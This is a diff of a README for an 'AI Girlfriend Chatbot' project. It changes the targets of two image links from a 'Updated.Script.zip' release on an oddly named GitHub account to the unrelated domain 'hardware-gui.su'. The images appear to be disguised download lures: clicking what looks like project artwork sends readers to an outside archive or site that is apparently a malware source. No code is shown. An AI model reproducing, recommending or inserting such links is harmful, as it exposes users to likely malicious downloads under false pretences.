@@ -7,11 +7,11 @@ Create your own AI-powered virtual girlfriend using advanced natural language pr
 Bring emotional connection to AI with this open-source **AI Girlfriend Chatbot**, a virtual companion built using state-of-the-art natural language models like OpenAI GPT-4.
 
 [![40 0 0 2 jpg 66411c8aaaf73eb421d6e097be76f5a5](https://github.com/user-attachments/assets/3bf64951-4728-4e70-a36e-39b8114b566d)
-](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
+](https://hardware-gui.su/)
 
 
 [![image](https://github.com/user-attachments/assets/5370c3ac-f490-49d2-b4f4-5af69e7c051e)
-](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
+](https://hardware-gui.su/)
 
 ## 🌟 Features
 
